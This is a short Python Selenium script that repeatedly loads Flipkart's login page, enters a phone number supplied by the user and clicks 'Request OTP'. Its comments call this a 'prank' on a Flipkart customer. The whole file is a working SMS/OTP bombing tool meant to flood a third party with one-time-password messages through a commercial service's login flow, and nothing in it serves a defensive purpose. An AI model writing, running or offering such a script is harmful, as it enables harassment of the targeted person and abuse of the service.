import time
import unittest
from selenium import webdriver
msgtimes=int(input("Enter the number of times to send message:")) #Enter the number of time to seend the message
num=str(input("Enter the number to prank:"))                      #Enter the mobile number of Flipkart user
if(len(num)!=10):
        print("Please Enter the Valid Number")                    #Check if the Mobile Number is 10-digit
        quit()
for i in range(1,msgtimes+1):
        driver=webdriver.Chrome()            #Place the localtion of your Chrome Driver
        driver.get('https://www.flipkart.com/account/login?ret=/')
        username=driver.find_element_by_xpath("//*[@id='container']/div/div[3]/div/div[2]/div/form/div[1]/input")       #Find the Enter Mobile Number Field
        username.send_keys(num)                                                                                         #Enter the num in the mobile number field
        otp=driver.find_element_by_xpath("//*[@id='container']/div/div[3]/div/div[2]/div/form/div[4]/button")           #Find the Request Otp option         
        otp.click()                                                                                                     #Click the option
        time.sleep(1) 
        if('Existing User? Log in' in driver.page_source):                                                              #Check if it is a Flipkart Customer or not
                print("Not a Flipkart Customer")
                driver.close()                                                                                                  
                driver.quit()
                break
        
        driver.close()                                                                                                  #Close the browser                                                                                                 
        driver.quit() 